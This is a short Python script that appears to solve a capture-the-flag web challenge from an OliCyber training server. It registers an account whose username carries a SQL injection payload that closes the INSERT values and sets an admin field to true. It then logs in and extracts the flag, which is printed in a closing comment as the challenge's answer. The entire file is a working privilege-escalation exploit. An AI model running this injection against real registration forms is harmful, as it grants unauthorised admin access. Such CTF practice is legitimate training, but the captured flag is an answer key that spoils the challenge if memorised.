import requests
import re

site = "http://adminsecret.challs.olicyber.it"

data1 = {
    "username" : "zamvvv', 'password', true) -- " , #username va cambiato ogni volta per non dare errore duplicato
    "password" : "123"
}


data2 = {
    "username" : "zamvvv",
    "password" : "password"
}

r1 = requests.post(f"{site}/register.php", data=data1)
r2 = requests.post(f"{site}/login.php", data=data2).text

match = re.search(r'flag\{[^\}]+\}', r2)
flag = match.group(0)
print(flag)
#flag{c0me_se1_div3ntato_admin}
